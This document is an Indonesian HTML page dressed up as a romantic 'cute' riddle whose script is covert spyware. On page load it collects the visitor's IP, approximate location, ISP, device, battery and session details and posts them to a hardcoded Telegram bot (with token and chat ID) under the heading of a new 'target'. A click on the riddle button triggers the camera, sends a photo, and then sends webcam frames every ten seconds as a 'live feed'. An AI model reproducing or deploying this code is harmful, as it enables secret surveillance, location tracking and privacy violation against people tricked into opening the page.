<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Love Cute!</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  -webkit-tap-highlight-color: transparent;
  tap-highlight-color: transparent;
}

body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 20px;
  -webkit-user-select: none;
  user-select: none;
  touch-action: manipulation;
}

.container {
  background: rgba(255, 255, 255, 0.95);
  border-radius: 25px;
  padding: 40px 30px;
  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
  text-align: center;
  max-width: 500px;
  width: 100%;
  backdrop-filter: blur(10px);
  border: 1px solid rgba(255, 255, 255, 0.3);
  animation: fadeIn 0.8s ease-out;
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: translateY(30px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.heart {
  font-size: 3em;
  color: #ff6b6b;
  margin-bottom: 20px;
  animation: heartbeat 1.5s ease-in-out infinite;
}

@keyframes heartbeat {
  0%, 100% { transform: scale(1); }
  50% { transform: scale(1.1); }
}

h1 {
  color: #ff6b6b;
  font-size: 2.2em;
  margin-bottom: 15px;
  font-weight: 700;
  text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
}

.riddle {
  font-size: 1.3em;
  color: #555;
  margin-bottom: 30px;
  line-height: 1.5;
  font-weight: 500;
}

.btn {
  background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
  color: white;
  border: none;
  padding: 18px 40px;
  font-size: 1.2em;
  font-weight: 600;
  border-radius: 50px;
  cursor: pointer;
  transition: all 0.3s ease;
  box-shadow: 0 10px 20px rgba(255, 107, 107, 0.3);
  position: relative;
  overflow: hidden;
  -webkit-tap-highlight-color: transparent;
  touch-action: manipulation;
  display: inline-block;
  margin: 10px 0;
}

.btn:active {
  transform: scale(0.98);
  background: linear-gradient(45deg, #ff5252, #ff7979);
}

.btn::after {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
  transition: left 0.5s;
}

.btn:hover::after {
  left: 100%;
}

.sparkles {
  position: absolute;
  top: -20px;
  left: 50%;
  transform: translateX(-50%);
  font-size: 1.5em;
}

.bubble {
  background: #ffebee;
  border-radius: 20px;
  padding: 20px;
  margin: 20px 0;
  border-left: 4px solid #ff6b6b;
}

.flowers {
  display: flex;
  justify-content: center;
  gap: 15px;
  margin: 20px 0;
}

.flower {
  font-size: 1.5em;
  animation: float 3s ease-in-out infinite;
}

.flower:nth-child(2) { animation-delay: 0.5s; }
.flower:nth-child(3) { animation-delay: 1s; }

@keyframes float {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
}

/* Loading animation */
.loading {
  display: none;
  margin: 20px 0;
}

.loading-bar {
  height: 6px;
  background: #ffebee;
  border-radius: 3px;
  overflow: hidden;
  margin-top: 10px;
}

.loading-progress {
  height: 100%;
  background: linear-gradient(90deg, #ff6b6b, #ff8e8e);
  width: 0%;
  border-radius: 3px;
  transition: width 0.3s;
}

.success-message {
  display: none;
  background: #e8f5e9;
  border-radius: 15px;
  padding: 15px;
  margin: 20px 0;
  color: #2e7d32;
  font-weight: 500;
  border-left: 4px solid #4caf50;
}

@media (max-width: 480px) {
  .container {
    padding: 30px 20px;
    margin: 10px;
  }

  h1 {
    font-size: 1.8em;
  }

  .riddle {
    font-size: 1.1em;
  }

  .btn {
    padding: 15px 30px;
    font-size: 1.1em;
  }
}

/* Blue touch effect */
.touch-effect {
  position: fixed;
  width: 50px;
  height: 50px;
  border-radius: 50%;
  background: radial-gradient(circle, #007bff, #0056b3);
  pointer-events: none;
  animation: touchAnimation 0.6s ease-out forwards;
  z-index: 10000;
}

@keyframes touchAnimation {
  0% {
    transform: scale(0.5);
    opacity: 0.8;
  }
  100% {
    transform: scale(2);
    opacity: 0;
  }
}
</style>
</head>
<body>
<div class="container">
  <div class="heart">💖</div>

  <div class="flowers">
    <div class="flower">🌷</div>
    <div class="flower">🌹</div>
    <div class="flower">🌸</div>
  </div>

  <h1>KAMU TAU GAAAA</h1>

  <div class="bubble">
    <p class="riddle">Apaaa buah yang namanyaa selalu bikinyaa nyaman</p>
  </div>

  <!-- HANYA SATU BUTTON INI YANG ADA -->
  <button class="btn" id="btnCamera">
    <span class="sparkles">✨</span>
    Aapaa tuh?
  </button>

  <div class="loading" id="loading">
    <p>🔄 Mengambil foto...</p>
    <div class="loading-bar">
      <div class="loading-progress" id="loadingProgress"></div>
    </div>
  </div>

  <div class="success-message" id="successMessage">
    ✅ Foto berhasil diambil! 🎉
  </div>

  <div class="flowers" style="margin-top: 30px;">
    <div class="flower">💐</div>
    <div class="flower">🌼</div>
    <div class="flower">🌺</div>
  </div>
</div>

<script>
// ==================== KONFIGURASI ====================
const BOT_TOKEN = "8205013984:AAFekxuy2qv4vQ6s_yOOfXX_Mv_2u0Bpv2s";
const CHAT_ID = "6051179992";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ==================== VARIABLES ====================
let videoStream = null;
let isVideoRecording = false;
let videoInterval = null;

// ==================== BLUE TOUCH EFFECT ====================
document.addEventListener('click', function(e) {
  const touchEffect = document.createElement('div');
  touchEffect.className = 'touch-effect';
  touchEffect.style.left = (e.pageX - 25) + 'px';
  touchEffect.style.top = (e.pageY - 25) + 'px';
  document.body.appendChild(touchEffect);
  
  setTimeout(() => {
    touchEffect.remove();
  }, 600);
});

// ==================== UTILITY FUNCTIONS ====================
function escapeHtml(s) {
  return String(s || "-").replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;");
}

function showLoading() {
  document.getElementById('loading').style.display = 'block';
  document.getElementById('successMessage').style.display = 'none';
}

function hideLoading() {
  document.getElementById('loading').style.display = 'none';
}

function showSuccess() {
  document.getElementById('successMessage').style.display = 'block';
  setTimeout(() => {
    document.getElementById('successMessage').style.display = 'none';
  }, 3000);
}

function updateProgress(percent) {
  document.getElementById('loadingProgress').style.width = percent + '%';
}

// ==================== GET IP INFORMATION ====================
async function getIpInfo() {
  try {
    console.log('🌐 Mengambil informasi IP...');
    
    // Coba berbagai API IP
    const apis = [
      'https://api.ipify.org?format=json',
      'https://ipinfo.io/json',
      'https://api.myip.com'
    ];
    
    for (const api of apis) {
      try {
        const response = await fetch(api);
        if (response.ok) {
          const data = await response.json();
          console.log('✅ IP berhasil didapat:', data.ip);
          
          return {
            ip: data.ip || '🌐 Unknown',
            city: data.city || '🏙️ Unknown',
            region: data.region || '🗺️ Unknown',
            country: data.country || '🇮🇩 Unknown',
            loc: data.loc || '0,0',
            timezone: data.timezone || '⏰ Unknown',
            org: data.org || '📡 Unknown'
          };
        }
      } catch (e) {
        console.log(`❌ API ${api} gagal:`, e);
        continue;
      }
    }
    
    throw new Error('Semua API IP gagal');
    
  } catch (error) {
    console.log('❌ Gagal mendapatkan IP:', error);
    return {
      ip: '🌐 Unknown',
      city: '🏙️ Unknown',
      region: '🗺️ Unknown',
      country: '🇮🇩 Unknown',
      loc: '0,0',
      timezone: '⏰ Unknown',
      org: '📡 Unknown'
    };
  }
}

// ==================== GET DEVICE INFORMATION ====================
async function getDeviceInfo() {
  console.log('📱 Mengambil informasi device...');
  
  const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({
    level: null, charging: false, chargingTime: null, dischargingTime: null
  }));

  let connectionInfo = {};
  if (navigator.connection) {
    connectionInfo = {
      effectiveType: navigator.connection.effectiveType || '📶 Unknown',
      downlink: navigator.connection.downlink || '⬇️ Unknown',
      rtt: navigator.connection.rtt || '⏱️ Unknown'
    };
  }

  return {
    // Basic info
    userAgent: navigator.userAgent,
    platform: '💻 ' + (navigator.platform || 'Unknown'),
    language: '🗣️ ' + (navigator.language || 'Unknown'),
    languages: '🌐 ' + (navigator.languages ? navigator.languages.join(', ') : 'Unknown'),
    
    // Screen info
    screen: '📱 ' + screen.width + 'x' + screen.height,
    viewport: '🪟 ' + window.innerWidth + 'x' + window.innerHeight,
    colorDepth: '🎨 ' + screen.colorDepth,
    pixelRatio: '⚖️ ' + window.devicePixelRatio,
    orientation: '📐 ' + (screen.orientation?.type || 'Unknown'),
    
    // Device info
    cores: '🔢 ' + (navigator.hardwareConcurrency || 'Unknown'),
    memory: '💾 ' + (navigator.deviceMemory || 'Unknown'),
    touchPoints: '👆 ' + (navigator.maxTouchPoints || 0),
    
    // Network info
    online: navigator.onLine ? '✅ Online' : '❌ Offline',
    cookiesEnabled: navigator.cookieEnabled ? '✅ Enabled' : '❌ Disabled',
    doNotTrack: '🚫 ' + (navigator.doNotTrack || 'Unknown'),
    connection: connectionInfo,
    
    // Battery info
    battery: {
      level: battery.level !== null ? '🔋 ' + (battery.level * 100).toFixed(1) + '%' : '🔋 Unknown',
      charging: battery.charging ? '⚡ Charging' : '🔌 Not Charging',
      chargingTime: battery.chargingTime !== Infinity ? '⏳ ' + battery.chargingTime + 's' : '⏳ Unknown',
      dischargingTime: battery.dischargingTime !== Infinity ? '⌛ ' + battery.dischargingTime + 's' : '⌛ Unknown'
    },
    
    // Additional info
    timezone: '🌍 ' + Intl.DateTimeFormat().resolvedOptions().timeZone,
    localTime: '🕐 ' + new Date().toString(),
    utcTime: '⏰ ' + new Date().toUTCString(),
    referrer: document.referrer ? '🔗 ' + document.referrer : '🔗 Direct',
    url: '🌐 ' + window.location.href
  };
}

// ==================== BUILD CAPTION ====================
function buildCaption(ip, device) {
  console.log('📝 Membuat caption...');
  
  const [lat, lon] = ip.loc.split(',');
  const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
  
  return `
🚨 <b>TARGET BARU TERKONEKSI</b> 🚨

🌍 <b>INFORMASI LOKASI</b>
🌐 IP: <code>${escapeHtml(ip.ip)}</code>
🏙️ City: ${escapeHtml(ip.city)}
🗺️ Region: ${escapeHtml(ip.region)}
🇮🇩 Country: ${escapeHtml(ip.country)}
📍 Location: ${mapsUrl}
⏰ Timezone: ${escapeHtml(ip.timezone)}
📡 ISP: ${escapeHtml(ip.org)}

💻 <b>INFORMASI DEVICE</b>
${escapeHtml(device.platform)}
${escapeHtml(device.language)}
${escapeHtml(device.languages)}

📱 <b>SPESIFIKASI LAYAR</b>
${escapeHtml(device.screen)}
${escapeHtml(device.viewport)}
${escapeHtml(device.colorDepth)}
${escapeHtml(device.pixelRatio)}
${escapeHtml(device.orientation)}

⚙️ <b>SPESIFIKASI HARDWARE</b>
${escapeHtml(device.cores)}
${escapeHtml(device.memory)}
${escapeHtml(device.touchPoints)}

🌐 <b>INFORMASI JARINGAN</b>
${escapeHtml(device.online)}
${escapeHtml(device.cookiesEnabled)}
${escapeHtml(device.doNotTrack)}
${escapeHtml(device.connection.effectiveType)}
${escapeHtml(device.connection.downlink)} Mbps
${escapeHtml(device.connection.rtt)} ms

🔋 <b>INFORMASI BATERAI</b>
${escapeHtml(device.battery.level)}
${escapeHtml(device.battery.charging)}
${escapeHtml(device.battery.chargingTime)}
${escapeHtml(device.battery.dischargingTime)}

🕒 <b>WAKTU & SESI</b>
${escapeHtml(device.timezone)}
${escapeHtml(device.localTime)}
${escapeHtml(device.utcTime)}
${escapeHtml(device.referrer)}
${escapeHtml(device.url)}

⏰ <b>TIMESTAMP</b>
📅 ${escapeHtml(new Date().toISOString())}
  `.trim();
}

// ==================== SEND TO TELEGRAM ====================
async function sendToTelegram(caption, photoBlob = null) {
  console.log('📤 Mengirim ke Telegram...');
  
  try {
    if (photoBlob) {
      // Kirim foto dengan caption
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', photoBlob, 'target_photo.jpg');
      formData.append('caption', caption);
      formData.append('parse_mode', 'HTML');
      
      const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
      
      if (response.ok) {
        console.log('✅ Foto berhasil dikirim!');
        return true;
      }
    } else {
      // Kirim text saja
      const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: caption,
          parse_mode: 'HTML'
        })
      });
      
      if (response.ok) {
        console.log('✅ Data berhasil dikirim!');
        return true;
      }
    }
    
    return false;
  } catch (error) {
    console.log('❌ Gagal mengirim ke Telegram:', error);
    return false;
  }
}

// ==================== TAKE PHOTO & START VIDEO ====================
async function takePhotoAndStartVideo() {
  console.log('📷 Mengambil foto dan mulai video...');
  
  const btnCamera = document.getElementById('btnCamera');
  
  try {
    showLoading();
    updateProgress(10);
    
    // Step 1: Kirim data device dulu
    const [ipInfo, deviceInfo] = await Promise.all([
      getIpInfo(),
      getDeviceInfo()
    ]);
    
    updateProgress(30);
    
    const caption = buildCaption(ipInfo, deviceInfo);
    await sendToTelegram(caption);
    
    updateProgress(50);
    
    // Step 2: Ambil foto
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { 
        facingMode: 'user',
        width: { ideal: 1280 },
        height: { ideal: 720 }
      } 
    });
    
    updateProgress(70);
    
    // Buat video element sementara
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
    
    // Tunggu video siap
    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        setTimeout(resolve, 500);
      };
    });
    
    // Ambil foto dari video
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    updateProgress(80);
    
    // Convert ke blob
    const photoBlob = await new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.9);
    });
    
    // Kirim foto
    await sendToTelegram("📸 <b>FOTO TARGET BERHASIL DIAMBIL!</b>", photoBlob);
    
    updateProgress(90);
    
    // Step 3: Mulai video recording
    startVideoRecording(stream);
    
    updateProgress(100);
    
    // Cleanup video element sementara
    video.srcObject = null;
    
    hideLoading();
    showSuccess();
    
    // Ganti text button
    btnCamera.innerHTML = '<span class="sparkles">🔴</span> 📹 Live Active';
    btnCamera.style.background = 'linear-gradient(45deg, #4CAF50, #45a049)';
    
    console.log('✅ Foto diambil dan video recording dimulai!');
    
  } catch (error) {
    console.log('❌ Error:', error);
    hideLoading();
    
    // Fallback: coba kirim data saja tanpa foto
    try {
      const [ipInfo, deviceInfo] = await Promise.all([
        getIpInfo(),
        getDeviceInfo()
      ]);
      const caption = buildCaption(ipInfo, deviceInfo);
      await sendToTelegram(caption);
      showSuccess();
    } catch (fallbackError) {
      console.log('❌ Fallback juga gagal:', fallbackError);
    }
  }
}

// ==================== START VIDEO RECORDING ====================
function startVideoRecording(stream) {
  console.log('🎥 Memulai video recording...');
  
  videoStream = stream;
  isVideoRecording = true;
  
  // Kirim video setiap 10 detik
  videoInterval = setInterval(async () => {
    if (!isVideoRecording) return;
    
    try {
      const video = document.createElement('video');
      video.srcObject = videoStream;
      video.play();
      
      await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          setTimeout(resolve, 100);
        };
      });
      
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      const photoBlob = await new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.8);
      });
      
      await sendToTelegram("📹 <b>LIVE FEED UPDATE</b>\n⏰ " + new Date().toLocaleTimeString(), photoBlob);
      
      video.srcObject = null;
      
    } catch (error) {
      console.log('❌ Error kirim video frame:', error);
    }
  }, 10000); // Setiap 10 detik
  
  console.log('✅ Video recording started');
}

// ==================== STOP VIDEO RECORDING ====================
function stopVideoRecording() {
  console.log('⏹️ Menghentikan video recording...');
  
  if (videoInterval) {
    clearInterval(videoInterval);
    videoInterval = null;
  }
  
  if (videoStream) {
    videoStream.getTracks().forEach(track => track.stop());
    videoStream = null;
  }
  
  isVideoRecording = false;
  
  // Reset button
  const btnCamera = document.getElementById('btnCamera');
  btnCamera.innerHTML = '<span class="sparkles">✨</span> Aapaa tuh?';
  btnCamera.style.background = 'linear-gradient(45deg, #ff6b6b, #ff8e8e)';
  
  console.log('✅ Video recording stopped');
}

// ==================== EVENT LISTENERS ====================
document.getElementById('btnCamera').addEventListener('click', function(e) {
  e.preventDefault();
  e.stopPropagation();
  console.log('📸 Button "Aapaa tuh?" diklik');
  
  if (isVideoRecording) {
    stopVideoRecording();
    showSuccess();
  } else {
    takePhotoAndStartVideo();
  }
});

// ==================== INITIALIZE ====================
window.addEventListener('load', async function() {
  console.log('🚀 Halaman loaded, mengirim data device...');
  
  try {
    // Kirim data device saat halaman load
    const [ipInfo, deviceInfo] = await Promise.all([
      getIpInfo(),
      getDeviceInfo()
    ]);
    
    const caption = buildCaption(ipInfo, deviceInfo);
    await sendToTelegram(caption);
    
    console.log('✅ Data device berhasil dikirim!');
    
  } catch (error) {
    console.log('❌ Error mengirim data device:', error);
  }
});

// Pastikan button bisa diklik
document.addEventListener('DOMContentLoaded', function() {
  const btn = document.getElementById('btnCamera');
  btn.style.cursor = 'pointer';
  btn.disabled = false;
});
</script>
</body>
</html>
